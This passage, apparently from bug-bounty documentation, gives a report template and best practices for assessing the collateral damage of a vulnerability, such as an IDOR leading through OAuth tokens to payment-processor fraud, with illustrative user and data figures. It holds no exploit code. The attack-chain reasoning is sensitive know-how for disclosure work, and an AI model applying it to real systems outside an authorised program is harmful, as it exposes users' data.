echo "=== Assessment Complete ==="
```

::

---

## CDA Report Template

::steps{level="4"}

#### Impact Summary Header

```
## Collateral Damage Assessment

**Vulnerability:** [Type — e.g., IDOR on /api/users/{id}]
**Endpoint:** [Full URL]
**Discovery Date:** [Date]
**Assessment Date:** [Date]

### Blast Radius Summary

| Dimension              | Finding                          |
|------------------------|----------------------------------|
| Affected Users         | [X] users / [X] organizations    |
| Data Types Exposed     | [PII categories]                 |
| Systems Reachable      | [X] internal services            |
| Cascade Depth          | [X] levels                       |
| Exposure Window        | [X] months/years                 |
| Regulatory Frameworks  | GDPR, CCPA, PCI DSS             |
| Estimated Financial    | $[X] (breach cost + fines)       |
```

#### User Impact Section

```
### User Impact

- **Total users in blast radius:** 2,347,891
- **User roles affected:**
  - Regular users: 2,340,000
  - Moderators: 7,500
  - Administrators: 391
- **Geographic distribution:**
  - EU (GDPR): 892,000 users
  - California (CCPA): 234,000 users
  - Other regions: 1,221,891 users
- **Active sessions at risk:** ~45,000 concurrent
```

#### Data Exposure Section

```
### Data Exposure Classification

**Critical (Tier 1):**
- Password hashes (bcrypt) — all 2.3M users
- API authentication tokens — 15,000 active tokens
- OAuth client secrets — 47 integrated applications

**High (Tier 2):**
- Email addresses — 2,347,891 records
- Phone numbers — 1,892,000 records
- Physical addresses — 1,456,000 records
- Date of birth — 2,100,000 records

**Estimated data volume:** 847 GB
**Estimated extraction time at rate limit:** 14.2 hours
```

#### Cascade Effect Section

```
### Cascade Effects

1. **Level 0:** IDOR on user API endpoint
2. **Level 1:** Access to all user records including OAuth tokens
3. **Level 2:** OAuth tokens grant access to 47 third-party integrations
4. **Level 3:** Third-party integrations include payment processors with stored card data
5. **Level 4:** Payment processor API access enables fraudulent transactions

**Cascade Multiplier:** Single vulnerability → 47 third-party services compromised
```

::

---

## CDA Best Practices

::card-group
  ::card
  ---
  title: Never Extract Real Data
  icon: i-lucide-shield-check
  ---
  Use **counts, field names, and structure analysis** to assess blast radius. Never download actual user PII. Sample 3–5 records maximum to classify data types.
  ::

  ::card
  ---
  title: Quantify Everything
  icon: i-lucide-hash
  ---
  Replace vague terms with numbers. Don't say "many users affected" — say **"2,347,891 users across 1,200 organizations in 47 countries."** Numbers drive severity decisions.
  ::

  ::card
  ---
  title: Map Every Cascade Level
  icon: i-lucide-git-branch
  ---
  Trace the vulnerability through every connected system. Document each cascade level with evidence. The **deeper the cascade, the higher the payout**.
  ::

  ::card
  ---
  title: Include Regulatory Context
  icon: i-lucide-scale
  ---
  Identify which **data protection regulations** apply. GDPR fines up to 4% of global revenue make even "medium" vulnerabilities existential threats when EU users are affected.
  ::

  ::card
  ---
  title: Calculate Financial Impact
  icon: i-lucide-dollar-sign
  ---
  Use industry benchmarks ($164/record for breach costs) multiplied by affected records. Include **regulatory fines, operational downtime, and customer churn** estimates.
  ::

  ::card
  ---
  title: Document the Exposure Window
  icon: i-lucide-calendar
  ---
  Use Wayback Machine, certificate transparency, and WHOIS data to estimate **how long the vulnerability has been exploitable**. Longer windows mean higher risk of prior exploitation.
  ::
::

::caution
Collateral Damage Assessment must be conducted **ethically and within program scope**. Never access more data than necessary to prove the blast radius. Use counts and metadata rather than extracting actual sensitive records. Document your methodology to demonstrate responsible disclosure.
::